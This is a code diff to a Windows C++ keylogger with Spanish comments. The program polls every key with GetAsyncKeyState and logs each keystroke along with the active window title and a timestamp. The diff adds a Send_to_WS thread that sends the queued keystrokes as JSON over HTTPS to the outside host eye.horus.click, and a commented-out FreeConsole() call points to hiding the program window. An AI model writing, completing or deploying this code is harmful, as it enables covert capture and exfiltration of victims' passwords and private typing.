@@ -4,7 +4,7 @@
 #include<string>
 #include<ctime>
 #include<lmcons.h>
-#include <winhttp.h>
+#include<winhttp.h>
 
 #pragma comment(lib, "winhttp.lib")
 
@@ -139,7 +139,6 @@ typedef struct tecla {
 	string key;
 	string nombre;
 } type_key;
-
 type_key str_key;
 
 bool TeclasPulsadas(int tecla) {
@@ -438,11 +437,26 @@ type_key* Dequeue(Queue* q) {
 
 //--Implementación de la cola--
 
+//Implementación del hilo
+DWORD WINAPI Send_to_WS(LPVOID lpParam) {
+	Queue* QUEUE = (Queue*)lpParam;
+	for (int i = 10; i > 0; i--) {
+		type_key* key = Dequeue(QUEUE);
+		string body = "{"
+			"\"Time\":\"" + key->tiempo + "\","
+			"\"Window\":\"" + key->ventana + "\","
+			"\"Key\":\"" + key->key + "\""
+			"}";
+		string ruta = "/evento/" + str_key.nombre;
+		HttpsWebRequestPost("eye.horus.click", ruta, body);
+	}
+}
+//--Implementación del hilo--
+
 int main() {
 	//FreeConsole();
 	unsigned char key;
 	Queue* QUEUE = getNewQueue();
-	type_key* send_key = (type_key*)malloc(sizeof(type_key));
 
 	//Desplegar Encabezados
 	cout << "Tecla\t\t\t";
@@ -453,18 +467,20 @@ int main() {
 	
 	while (TRUE) {
 		Sleep(10);
+		//Revisar el contenido de la cola, generar un hilo asíncrono y vaciarla para enviarla al web service
+		if (QUEUE->size == 10) {
 
+		}
 		for (key = 8; key <= 255; key++) {
 			if (GetAsyncKeyState(key) == -32767) {
 
 				if (TeclasPulsadas(key) == FALSE) {
-					//string temp_char_to_string(1, key);
 					str_key.key = key;
 					
 					Node* a = getNode(&str_key);
 					Enqueue(QUEUE, a);
 
-					//Envío al web service
+					//Envío al web service (Ahora se implementa en Send_to_WS)
 					/*
 					string body = "{"
 						"\"Time\":\""+str_key.tiempo+"\","
@@ -486,5 +502,4 @@ int main() {
 		}
 	}
 	free(QUEUE);
-	free(send_key);
 }
